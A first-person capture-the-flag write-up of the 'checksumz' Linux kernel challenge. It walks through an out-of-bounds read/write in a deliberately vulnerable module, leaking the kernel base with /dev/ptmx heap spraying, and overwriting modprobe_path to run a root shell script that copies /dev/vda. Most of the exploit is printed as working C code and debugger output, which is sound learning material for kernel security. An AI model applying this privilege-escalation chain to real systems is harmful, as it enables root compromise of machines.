# checksumz

Alright so this was my first kernel challenge that I have solved without looking at a writeup or anything and it was honestly really fun. I will say that I got some help from my buddy [Alex](https://github.com/SolarDebris) but he was very good about not giving me the answer and just kind of guiding me/giving me resources to look into so that way I wasn't dependent and could get the most out of this challenge.

So to get started, I installed a fork of [gef](https://github.com/bata24/gef) that would help me debug the kernel better (as you will see later on) since the challenge had an `attach.gdb` script that could be attached with `sudo gdb -x attach.gdb`.

### challenge
Alright now to the challenge, and thankfully, the challenge authors gave us the source code for the vulnerable kernel module. In the source code you can see that they changed up the functionality of `read`, `write`, and `lseek`. The bug was actually not that hard to find since basically all the program does is read and write from the location of where `buffer->state + buffer->pos` is. The `buffer->state` variable is the 512 byte buffer that we are writing to, while `buffer->pos` is the offset that we are writing to, modified by `lseek`. Here is the struct used for `buffer`:

```c
struct checksum_buffer {
	loff_t pos;
	char state[512];
	size_t size;
	size_t read;
	char* name;
	uint32_t s1;
	uint32_t s2;
};
```

And here are the vulnerable lines of code in both read and write:

```c
// read
ssize_t copied = copy_to_iter(buffer->state + buffer->pos, min(bytes, 256), to);

// write
ssize_t copied = copy_from_iter(buffer->state + buffer->pos, min(bytes, 16), from);
```

Now with this in mind, that means that we can set `buffer->pos` to be whatever offset you want and then you basically have unlimited read and write. The only thing stopping you is the fact that `lseek` makes sure that `pos` is less than the `size` value. 

```c
if (buffer->pos >= buffer->size)
    buffer->pos = buffer->size - 1;
```

Now this won't matter though since you still have a 15 byte overwrite if you set `pos` to be 511 (`size` is 512) and then you can overwrite size so you can create any offset you want.

```c
void overwrite_size() {
  lseek(fd, 504, SEEK_SET);

  char buf[16] = "AAAAAAAABBBBBBBB";
  write(fd, buf, 16);
}
```

Okay great! Now that we have unlimited read and write we can get a dump of the memory!

```
[*] GETTING MEMORY DUMP
0x4141414141414141 0x4242424242424242 
2: 0x0 0xff18dfa982303c00 
4: 0x1 0x0 
6: 0x0 0x0 
8: 0x0 0x0 
10: 0x0 0x0 
12: 0x0 0x0 
14: 0x0 0x0 
16: 0x0 0x0 
18: 0x0 0x0 
20: 0x0 0x0 
22: 0x0 0x0 
24: 0x0 0x0 
26: 0x0 0x0 
28: 0x0 0x0 
30: 0x0 0x0 
32: 0x6200000001 0x0 
...
```

Now with this in mind, we have to be mindful of where we are, in this case, we are in the `kmalloc-1024` heap (you can calculate this by just looking at the struct). So now, how do we get a kernel base leak since `kaslr` and `fg-kaslr` are both enabled? Well in this case, all I did was groom the heap by opening `/dev/ptmx` 200 times since it has a kernel address inside the heap. I found this out on [this article here](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628). 

```c
int main() {
    int tmp = open("/dev/ptmx", O_RDWR);

    for (int i = 0; i < 100; i++) {
      tmp = open("/dev/ptmx", O_RDWR);
    }

    fd = open("/dev/checksumz", O_RDWR);

    for (int i = 0; i < 100; i++) {
      tmp = open("/dev/ptmx", O_RDWR);
    }
    ...
}
```

Now with this in mind, we can look at the memory dump and see a kernel address in index 36:

```
[*] GETTING MEMORY DUMP
0x4141414141414141 0x4242424242424242 
2: 0x0 0xff2aa7adc1f19400 
4: 0x1 0x0 
6: 0x0 0x0 
8: 0x0 0x0 
10: 0x0 0x0 
12: 0x0 0x0 
14: 0x0 0x0 
16: 0x0 0x0 
18: 0x0 0x0 
20: 0x0 0x0 
22: 0x0 0x0 
24: 0x0 0x0 
26: 0x0 0x0 
28: 0x0 0x0 
30: 0x0 0x0 
32: 0x6500000001 0x0 
34: 0xff2aa7adc194ec00 0xff2aa7adc1eaae00 
36: 0xffffffffabe89360 0xff2aa7adc1d8e5e0 
```

And this is how I got the base:

```c
void get_kbase() {
  kbase = mem[36] - 0x1289360;

  printf("[*] KBASE LEAK: 0x%llx\n", kbase);
}
```

Also you can see the kernel base by attaching gdb and running `kbase`:

```
gef> kbase
[+] Wait for memory scan
kernel text:   0xffffffff81000000-0xffffffff82200000 (0x1200000 bytes)
kernel rodata: 0xffffffff82200000-0xffffffff828dd000 (0x6dd000 bytes)
kernel data:   0xffffffff828dd000-0xffffffff834f6000 (0xc19000 bytes)
```

So now that I got the kernel base, my next target is the `modprobe path`. The reason why is because `modprobe` is a program that is used for a lot of things file related, and one of them is in case the computer reads a file with unknown magic bytes. So if I change the `modprobe path` and then try and run a binary with unknown magic bytes, then the kernel will then run the program at the path that I wrote. 

Okay cool, but how would I overwrite the path? Well luckily, the `checksum_buffer` struct has a pointer to a `name` character buffer and the `ioctl` allows you to change the name. So if I change the `name` pointer to the address of `modprobe path` and then call the ioctl telling it to let me change the name variable, then I will get control of the `modprobe path`.

```c
void overwrite_modprobepath() {
  lseek(fd, 528, SEEK_SET);

  unsigned long long modprobe = kbase + 0x1b3f100;
  write(fd, &modprobe, 8);
   
  char new_path[] = "/tmp/balls";
  ioctl(fd, CHECKSUMZ_IOCTL_RENAME, new_path);
}
```

```
gef> kmagic
[+] Wait for memory scan
kernel_base                                0xffffffff81000000 (0x1200000 bytes)
---------------------------------- Legend ----------------------------------
Symbol                                     Addr               Perm  (+Offset    ) -> Value             
-------------------------------- Credential --------------------------------
commit_creds                               0xffffffff810b98a0 [R-X] (+0x000b98a0) -> 0x4c655441fa1e0ff3
prepare_kernel_cred                        0xffffffff810b9d90 [R-X] (+0x000b9d90) -> 0x85485355fa1e0ff3
init_cred                                  0xffffffff82a52ae0 [RW-] (+0x01a52ae0) -> 0x0000000000000004
__sys_setuid                               0xffffffff810a0d20 [R-X] (+0x000a0d20) -> 0x54415541001f0f66
init_task                                  0xffffffff82a0c940 [RW-] (+0x01a0c940) -> 0x0000000000004000
------------------------------ Usermode helper ------------------------------
call_usermodehelper                        0xffffffff810a4780 [R-X] (+0x000a4780) -> 0x4101f983fa1e0ff3
run_cmd                                             Not found
modprobe_path                              0xffffffff82b3f100 [RW-] (+0x01b3f100) -> /tmp/balls <==============
...
```

Now that I have done that, all I have to do is create a shell script that will write the flag into `/tmp` and then call an unknown binary, then I will be able to get the flag!

```c
puts("[*] OVERWRITING MOD PROBE PATH");
overwrite_modprobepath();

puts("[*] CREATING MODPROBE SCRIPT");
system("echo -en '#!/bin/sh\ncat /dev/vda > /tmp/flag' > /tmp/balls");
system("chmod +x /tmp/balls");

puts("[*] FINISHED OVERWRITING MOD PROBE PATH, NOW RUNNING BINARY WITH MODIFIED MAGIC BYTES");
system("/home/user/magic");
```

```
~ $ cat /tmp/flag
irisctf{fakeflag}~ $ 
~ $ 
```

Overall I learned a lot from this challenge and also now I feel a lot more comfortable and less intimidated when doing kernel challenges. I can't wait to try more of these kinds of challenges!

